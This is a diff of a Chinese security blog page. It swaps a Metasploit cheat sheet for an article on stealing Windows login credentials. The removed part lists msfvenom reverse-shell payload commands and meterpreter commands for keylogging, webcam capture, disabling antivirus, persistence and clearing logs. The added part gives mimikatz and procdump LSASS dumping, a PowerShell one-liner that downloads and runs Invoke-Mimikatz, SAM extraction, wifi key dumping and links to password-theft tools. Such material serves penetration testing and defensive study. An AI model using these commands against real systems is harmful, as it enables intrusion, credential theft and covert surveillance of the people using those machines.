@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>工具使用--MSF | Beret-81</title>
-  <meta name="keywords" content=" 工具使用、渗透测试 ">
-  <meta name="description" content="工具使用--MSF | Beret-81">
+  <title>渗透测试--Windows下登录凭证窃取技巧 | Beret-81</title>
+  <meta name="keywords" content=" 登录凭证窃取技巧 ">
+  <meta name="description" content="渗透测试--Windows下登录凭证窃取技巧 | Beret-81">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Windows下登录凭证窃取技巧1、Windows 本地密码Hash Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。Windows系统下hash密码格式用户名称:RID:LM-HASH值:NT-HASH值。  例如： Administrator:500:AF01DF70036EBACFAAD3B435B51404EE:44F07">
 <meta property="og:type" content="article">
@@ -563,9 +563,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-工具使用--MSF" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-渗透测试-Windows下登录凭证窃取技巧" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">工具使用--MSF</h1>
+        <h1 class="article-title">渗透测试--Windows下登录凭证窃取技巧</h1>
     
     <div class="article-meta">
         
@@ -575,7 +575,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="工具使用">工具使用</a>
+            <a  data-rel="渗透测试">渗透测试</a>
             
         </span>
         
@@ -583,14 +583,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">工具使用、渗透测试</a>
+            <a class="color4">登录凭证窃取技巧</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-09-25 15:06:44'>2019-03-04 22:06</time>
+            Created At : <time class="date" title='Updated At: 2020-10-30 11:12:51'>2020-10-11 16:54</time>
         
     </div>
     <div class="article-meta">
@@ -612,7 +612,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#工具使用–MSF"><span class="toc-text">工具使用–MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-基础用法"><span class="toc-text">MSF 基础用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、生成-payload"><span class="toc-text">1、生成 payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、设置监听端口监听"><span class="toc-text">2、设置监听端口监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、msf-常用命令"><span class="toc-text">3、msf 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、更多命令"><span class="toc-text">4、更多命令</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows下登录凭证窃取技巧"><span class="toc-text">Windows下登录凭证窃取技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、Windows-本地密码Hash"><span class="toc-text">1、Windows 本地密码Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、抓取浏览器密码"><span class="toc-text">2、抓取浏览器密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、服务端明文存储密码"><span class="toc-text">3、服务端明文存储密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、第三方运维工具托管密码解密"><span class="toc-text">4、第三方运维工具托管密码解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、一键获取电脑wifi密码"><span class="toc-text">5、一键获取电脑wifi密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、Windows键盘记录工具"><span class="toc-text">6、Windows键盘记录工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7、Windows密码提取工具合集"><span class="toc-text">7、Windows密码提取工具合集</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -628,260 +628,133 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="工具使用–MSF"><a href="#工具使用–MSF" class="headerlink" title="工具使用–MSF"></a>工具使用–MSF</h1><h2 id="MSF-基础用法"><a href="#MSF-基础用法" class="headerlink" title="MSF 基础用法"></a>MSF 基础用法</h2><h3 id="1、生成-payload"><a href="#1、生成-payload" class="headerlink" title="1、生成 payload"></a>1、生成 payload</h3><pre><code>语法：
-Msfvenom -p &lt;payload&gt; lhost=&lt;ip&gt; lport=&lt;port&gt; -f  &lt;type&gt;  -o &lt;name.type&gt;
-例子：
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt;-f exe -o payload.exe
-msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.16.200.139 lport=12345 -f elf -o 153.elf
+        <h1 id="Windows下登录凭证窃取技巧"><a href="#Windows下登录凭证窃取技巧" class="headerlink" title="Windows下登录凭证窃取技巧"></a>Windows下登录凭证窃取技巧</h1><h2 id="1、Windows-本地密码Hash"><a href="#1、Windows-本地密码Hash" class="headerlink" title="1、Windows 本地密码Hash"></a>1、Windows 本地密码Hash</h2><blockquote>
+<p>Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。Windows系统下hash密码格式用户名称:RID:LM-HASH值:NT-HASH值。</p>
+</blockquote>
+<pre><code>例如：
+Administrator:500:AF01DF70036EBACFAAD3B435B51404EE:44F077E27F6FEF69E7BD834C7242B040
 
-Msfvenom 生成各种 Payload 
-Linux
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
-windows
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe
-mac
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho
-PHP
-msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
-cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
-ASP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp
-JSP
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp
-WAR
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war
-Python
-msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py
-Bash
-msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh
-Perl
-msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl
-Linux Based Shellcode
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;
-Windows Based Shellcode
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;
-Mac Based Shellcode
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></pre><h3 id="2、设置监听端口监听"><a href="#2、设置监听端口监听" class="headerlink" title="2、设置监听端口监听"></a>2、设置监听端口监听</h3><pre><code>1、终端输入：msfconsole -q(安静模式)
-2、use exploit/multi/handler
-3、show options(查看需要配置哪些信息)
-4、set payload windows/meterpreter/reverse_tcp
-5、set lhost 192.168.8.12
-6、set lport 4444
-7、run
+用户名称为：Administrator
+RID为：500
+LM-HASH值为：AF01DF70036EBACFAAD3B435B51404EE
+NT-HASH值为：44F077E27F6FEF69E7BD834C7242B040</code></pre><p> 破解方式一：hash在线破解网站</p>
+<pre><code>https://www.objectif-securite.ch/ophcrack
+http://cmd5.com</code></pre><p> 破解方式二：mimikatz</p>
+<pre><code>Github地址：https://github.com/gentilkiwi/mimikatz
 
-常用的几个payload:
-windows/meterpreter/bind_tcp       #正向连接
-windows/meterpreter/reverse_tcp    #反向连接，常用
-windows/meterpreter/reverse_http   #通过监听80端口反向连接
-windows/meterpreter/reverse_https  #通过监听443端口反向连接
+mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令：
 
-正向连接：攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。
+privilege::debug
+sekurlsa::logonpasswords</code></pre><p>破解方式三：wce</p>
+<pre><code>wce的常用参数使用说明如下：
 
-反向连接：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。
+参数解释:
+  -l     列出登录的会话和NTLM凭据（默认值）
+  -s     修改当前登录会话的NTLM凭据 参数：&lt;用户名&gt;:&lt;域名&gt;:&lt;LM哈希&gt;:&lt;NT哈希&gt;
+  -w     通过摘要式认证缓存一个明文的密码</code></pre><p>破解方式四：Powershell+mimikatz</p>
+<pre><code>直接利用poweshell来调用mimikatz抓取系统内的明文密码。
 
-反向连接80和443端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信</code></pre><h3 id="3、msf-常用命令"><a href="#3、msf-常用命令" class="headerlink" title="3、msf 常用命令"></a>3、msf 常用命令</h3><pre><code>exit                #从shell 中退出到msf
-bg(bachground)      #获取shell后，放到后台执行
-sesions -l          #查看shell
-sesions -i 1        #进入id为1的shell
-shell               #进入目标主机shell(cmd)
-chcp 65001          #设置中文编码（解决乱码）
+powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre><p>破解方式五：prodump+mimikatz</p>
+<pre><code>procdump是微软官方提供的一个小工具，微软官方下载地址：
+https://technet.microsoft.com/en-us/sysinternals/dd996900
 
+# 将工具拷贝到目标机器上执行如下命令（需要管理员权限,我选择的版本是64位）
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# 将生成的内存dump文件拷贝到mimikatz同目录下，双击打开mimikatz执行情况如图：
+mimikatz # sekurlsa::minidump lsass.dmp
+# Switch to MINIDUMP
+mimikatz # sekurlsa::logonPasswords full</code></pre><p>破解方式六：Getpass 获取明文密码</p>
+<pre><code>C:\getpass&gt;GetPassword_x64.exe
+活动代码页: 936
 
-sysinfo             #查看目标主机系统信息
-run scraper         #查看目标主机详细信息
-run hashdump        #导出密码的哈希
-load kiwi           #加载mimikatz
-ps                  #查看目标主机进程信息
-pwd                 #查看目标当前目录(windows)
-getlwd              #查看目标当前目录(Linux)
-search -f *.jsp -d e:\        #搜索E盘中所有以.jsp为后缀的文件
-download  e:\test.txt  /root  #将目标机的e:\test.txt文件下载到/root目录下
-upload/root/test.txt d:\test  #将/root/test.txt上传到目标机的 d:\test\ 目录下
-getpid              #查看当前Meterpreter Shell的进程PID
-migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
-idletime            #查看主机运行时间
-getuid              #查看获取的当前权限
-getsystem           #提权,获得的当前用户是administrator才能成功
-run  killav         #关闭杀毒软件
-screenshot          #截图
-webcam_list         #查看目标主机的摄像头
-webcam_snap         #拍照
-webcam_stream       #开视频
-execute  参数  -f 可执行文件   #执行可执行程序
-run getgui -u hack -p 123#创建hack用户，密码为123
-run getgui -e       #开启远程桌面
-keyscan_start       #开启键盘记录功能
-keyscan_dump        #显示捕捉到的键盘记录信息
-keyscan_stop        #停止键盘记录功能
-uictl  disable  keyboard    #禁止目标使用键盘
-uictl  enable   keyboard    #允许目标使用键盘
-uictl  disable  mouse       #禁止目标使用鼠标
-uictl  enable   mouse       #允许目标使用鼠标
-load                #使用扩展库
-run                    #使用扩展库
+Authentication Id:0;2761032
+Authentication Package:NTLM
+Primary User:Administrator
+Authentication Domain:WIN-HF1GDGEQAJ7
 
-run persistence -X -i 5 -p 8888 -r 192.168.10.27#反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
-portfwd add -l 3389 -r 192.168.100.200 -p 3389 #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.100.200是获取权限的主机的ip地址
-clearev             #清除日志
+* User: Administrator
+* Domain: WIN-HF1GDGEQAJ7
+* Password: test@123</code></pre><p>破解方式七：PwDump7.exe 获取散列值</p>
+<pre><code>获取所有账户的NTLM hash之后，可以使用彩虹表进行破解散列值，或者使用哈希传递的方法进行横向攻击。
+C:\mima\Pwdump7&gt;PwDump7.exe
+Pwdump v7.1 - raw password extractor
+Author: Andres Tarasco Acuna
+url: http://www.514.es
 
-Post 后渗透模块:
-该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。
-run post/windows/manage/migrate                       #自动进程迁移
-run post/windows/gather/checkvm                       #查看目标主机是否运行在虚拟机上
-run post/windows/manage/killav                        #关闭杀毒软件
-run post/windows/manage/enable_rdp                    #开启远程桌面服务
-run post/windows/manage/autoroute                     #查看路由信息
-run post/windows/gather/enum_logged_on_users          #列举当前登录的用户
-run post/windows/gather/enum_applications             #列举应用程序
-run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
-run post/windows/gather/smart_hashdump                #dump出所有用户的hash
+Administrator:500:NO PASSWORD*********************:2544B173811270811DA9C33B2C429913:::
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+test:1000:NO PASSWORD*********************:172DA611CFBFA85247ACF1F100A280A4:::</code></pre><p>破解方式八：QuarksPwDump.exe 获取散列值</p>
+<pre><code>C:\mima\QuarksPwDump_v0.1&gt;QuarksPwDump.exe --dump-hash-local
+[+] Setting BACKUP and RESTORE privileges...[OK]
+[+] Parsing SAM registry hive...[OK]
+[+] BOOTKEY retrieving...[OK]
+BOOTKEY = 81DFA3C9F19B1B76332912B73A9C7BD2
 
+--------------------------------------------- BEGIN DUMP--------------------------------------------
+test:1000:AAD3B435B51404EEAAD3B435B51404EE:579DA618CFBFA85247ACF1F800A280A4:::
+Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::
+Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:2544B8738142708D1DA9C33B2C429913:::
+---------------------------------------------- END DUMP ---------------------------------------------</code></pre><p>破解方式九：powershell 导出散列值</p>
+<pre><code>PS C:\mima&gt; Import-Module .\Get-PassHashes.ps1
+PS C:\mima&gt; Get-PassHashes
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2244b8738122708d1da1c33b2c429913:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+test:1000:aad3b435b51404eeaad3b435b51404ee:572da618cfb2a852472cf1f200a280a4:::</code></pre><p>破解方式十：通过SAM和System 文件抓取密码</p>
+<pre><code>1、导出SAM 和System 文件
+   无工具导出SAM文件，命令如下：
+   reg save hklm\sam sam.hive
+   reg save hklm\system system.hive
+2、读取SAM和system文件获取NTLM Hash
+   a、使用mimikatz 读取sam和system文件
+      将sam.hive、system.hive文件放在mimikatz同目录下，然后输入下面的命令，获取散列值：
+      lsadump::sam /sam:sam.hive /system:system.hive
 
-访问文件系统
-Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：
-cd：切换目标目录；
-cat：读取文件内容；
-rm：删除文件；
-edit：使用vim编辑文件
-ls：获取当前目录下的文件；
-mkdir：新建目录；
-rmdir：删除目录； </code></pre><h3 id="4、更多命令"><a href="#4、更多命令" class="headerlink" title="4、更多命令"></a>4、更多命令</h3><pre><code>Core Commands   核心命令
-=============
+   b、使用cain 读取SAM文件
+      安装cain后，关闭防火墙，运行cain,进入cracker模块，选择“LM&amp;NTLM”选项，选择“Import hashes from a sam database”选项。然后将之前保存的san文件导入，单击next按钮后，获取散列值。
 
-Command                   Description
--------                   -----------
-?                            Help menu
-background         Backgrounds the current session
-bgkill                     Kills a background meterpreter script
-bglist                     Lists running background scripts
-bgrun                      Executes a meterpreter script as a background thread
-channel                   Displays information or control active channels
-close                      Closes a channel
-disable_unicode_encoding   Disables encoding of unicode strings
-enable_unicode_encoding   Enables encoding of unicode strings
-exit                         Terminate the meterpreter session
-get_timeouts              Get the current session timeout values
-help                       Help menu
-info                        Displays information about a Post module
-irb                          Drop into irb scripting mode
-load                       Load one or more meterpreter extensions
-machine_id                Get the MSF ID of the machine attached to the session
-migrate                   Migrate the server to another process
-quit                      Terminate the meterpreter session
-read                      Reads data from a channel
-resource                  Run the commands stored in a file
-run                       Executes a meterpreter script or Post module
-set_timeouts              Set the current session timeout values
-sleep                     Force Meterpreter to go quiet, then re-establish session.
-transport                 Change the current transport mechanism
-use                       Deprecated alias for &apos;load&apos;
-uuid                      Get the UUID for the current session
-write                     Writes data to a channel
+   c、使用mimikatz直接读取本地SAM文件，导出hash 信息
+      privilege::debug ## 提升权限
+      token::elevate ##将权限提升到system
+      lsadump::sam ##读取本地SAM文件，获得NTLM hash。</code></pre><h2 id="2、抓取浏览器密码"><a href="#2、抓取浏览器密码" class="headerlink" title="2、抓取浏览器密码"></a>2、抓取浏览器密码</h2><blockquote>
+<p>很多浏览器都提供了记住密码的功能，用户在登录一些网站的时候会选择记住密码。</p>
+</blockquote>
+<p>LaZagne：提取浏览器所保存的密码</p>
+<pre><code>https://github.com/AlessandroZ/LaZagne</code></pre><p>BrowserGhost: 抓取浏览器密码的工具</p>
+<pre><code>https://github.com/QAX-A-Team/BrowserGhost</code></pre><h2 id="3、服务端明文存储密码"><a href="#3、服务端明文存储密码" class="headerlink" title="3、服务端明文存储密码"></a>3、服务端明文存储密码</h2><blockquote>
+<p>在一些配置文件或日志里，明文记录着敏感的密码信息，如web.config、config.ini等文件，可通过手动翻查敏感目录，也可以通过findstr命令来查找敏感文件和内容。</p>
+</blockquote>
+<pre><code>findstr /i /s &quot;password&quot; *.config
+findstr /i /s &quot;password&quot; *.ini
+findstr /i /s &quot;password&quot; *.xml</code></pre><h2 id="4、第三方运维工具托管密码解密"><a href="#4、第三方运维工具托管密码解密" class="headerlink" title="4、第三方运维工具托管密码解密"></a>4、第三方运维工具托管密码解密</h2><blockquote>
+<p>常见的有Linux运维工具，如Putty、xshell、winscp等，RDP管理工具，Remote Desktop Organizer，远控软件：Teamviewer等。</p>
+</blockquote>
+<p>xshell 密码解密工具：</p>
+<pre><code>https://github.com/dzxs/Xdecrypt</code></pre><p>提取WinSCP，PuTTY等保存的会话信息：</p>
+<pre><code>https://github.com/Arvanaghi/SessionGopher</code></pre><p>从内存中提取TeamViewer密码的工具：</p>
+<pre><code>https://github.com/attackercan/teamviewer-dumper</code></pre><p>一键破解客户端星号密码–星号密码查看器。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4k7S2FiaDDryLRgEzJMdOZnuZXSnoCjV1wN4icics6d1Z57koBJJFeianibEtwyMBg8AkodRlJtzlkFm8Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=""></p>
+<h2 id="5、一键获取电脑wifi密码"><a href="#5、一键获取电脑wifi密码" class="headerlink" title="5、一键获取电脑wifi密码"></a>5、一键获取电脑wifi密码</h2><pre><code>#查看电脑连接过的所有wifi
+netsh wlan show profiles
 
-Stdapi: File system Commands 文件系统命令
-============================
+#查看wifi信号为Aaron的密码
+ netsh wlan show profiles name=&quot;Aaron&quot; key=clear
 
-Command       Description
--------       -----------
-cat           Read the contents of a file to the screen
-cd            Change directory
-dir           List files (alias for ls)
-download      Download a file or directory
-edit          Edit a file
-getlwd        Print local working directory
-getwd         Print working directory
-lcd           Change local working directory
-lpwd          Print local working directory
-ls            List files
-mkdir         Make directory
-mv            Move source to destination
-pwd           Print working directory
-rm            Delete the specified file
-rmdir         Remove directory
-search        Search for files
-show_mount    List all mount points/logical drives
-upload        Upload a file or directory
+#CMD一键获取 所有连接过的WIFI密码
+for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</code></pre><h2 id="6、Windows键盘记录工具"><a href="#6、Windows键盘记录工具" class="headerlink" title="6、Windows键盘记录工具"></a>6、Windows键盘记录工具</h2><blockquote>
+<p>可以记录用户键盘操作，从而捕获用户的敏感信息，在github和T00ls都可以找到这一类的源码和工具。</p>
+</blockquote>
+<h2 id="7、Windows密码提取工具合集"><a href="#7、Windows密码提取工具合集" class="headerlink" title="7、Windows密码提取工具合集"></a>7、Windows密码提取工具合集</h2><blockquote>
+<p>各种Windows程序的密码提取工具，包括各种浏览器、邮箱、Windows网络密码、无线网络密钥等。</p>
+</blockquote>
+<p>IE浏览器提取密码工具：</p>
+<pre><code>https://www.nirsoft.net/toolsdownload/iepv.zip</code></pre><p>Firefox 浏览器密码提取工具：</p>
+<pre><code>https://www.nirsoft.net/toolsdownload/passwordfox-x64.zip</code></pre><p>Chrome 浏览器密码提取工具：</p>
+<pre><code>https://www.nirsoft.net/toolsdownload/chromepass.zip</code></pre><p>SVN密码解密器：</p>
+<pre><code>http://www.leapbeyond.com/ric/TSvnPD/TSvnPwd_source.zip</code></pre><p>邮箱密码提取工具：</p>
+<pre><code>https://www.nirsoft.net/toolsdownload/mailpv.zip</code></pre><p>提取.rdp文件中存储的密码：</p>
+<pre><code>https://www.nirsoft.net/toolsdownload/rdpv.zip</code></pre><p>MSSQL凭据密码获取工具：</p>
+<pre><code>http://www.zcgonvh.com/zb_users/upload/2015/2/mssql_credentials_pwd.zip</code></pre><p>原文链接：<a href="https://mp.weixin.qq.com/s/3QwQCoaa45SECdLo7DZ8xQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3QwQCoaa45SECdLo7DZ8xQ</a></p>
 
-Stdapi: Networking Commands 网络命令
-===========================
-
-Command       Description
--------       -----------
-arp                Display the host ARP cache
-getproxy       Display the current proxy configuration
-ifconfig        Display interfaces
-ipconfig      Display interfaces
-netstat       Display the network connections
-portfwd        Forward a local port to a remote service
-route          View and modify the routing table
-
-Stdapi: System Commands 系统命令
-=======================
-
-Command       Description
--------       -----------
-clearev       Clear the event log
-drop_token    Relinquishes any active impersonation token.
-execute       Execute a command
-getenv        Get one or more environment variable values
-getpid        Get the current process identifier
-getprivs      Attempt to enable all privileges available to the current process
-getsid        Get the SID of the user that the server is running as
-getuid        Get the user that the server is running as
-kill          Terminate a process
-ps            List running processes
-reboot        Reboots the remote computer
-reg           Modify and interact with the remote registry
-rev2self      Calls RevertToSelf() on the remote machine
-shell         Drop into a system command shell
-shutdown      Shuts down the remote computer
-steal_token   Attempts to steal an impersonation token from the target process
-suspend       Suspends or resumes a list of processes
-sysinfo       Gets information about the remote system, such as OS
-
-Stdapi: User interface Commands 用户界面命令
-===============================
-
-Command        Description
--------        -----------
-enumdesktops       List all accessible desktops and window stations
-getdesktop             Get the current meterpreter desktop
-idletime                    Returns the number of seconds the remote user has been idle
-keyscan_dump       Dump the keystroke buffer
-keyscan_start        Start capturing keystrokes
-keyscan_stop        Stop capturing keystrokes
-screenshot           Grab a screenshot of the interactive desktop
-setdesktop              Change the meterpreters current desktop
-uictl                       Control some of the user interface components
-
-Stdapi: Webcam Commands 摄像头命令
-=======================
-
-Command        Description
--------        -----------
-record_mic           Record audio from the default microphone for X seconds
-webcam_chat       Start a video chat
-webcam_list       List webcams
-webcam_snap    Take a snapshot from the specified webcam
-webcam_stream   Play a video stream from the specified webcam
-
-Priv: Elevate Commands 提权命令
-======================
-Command       Description
--------       -----------
-getsystem     Attempt to elevate your privilege to that of local system.
-
-Priv: Password database Commands 密码
-================================
-Command       Description
--------       -----------
-hashdump      Dumps the contents of the SAM database
-
-Priv: Timestomp Commands 时间戳命令
-========================
-Command       Description
--------       -----------
-timestomp     Manipulate file MACE attributes</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
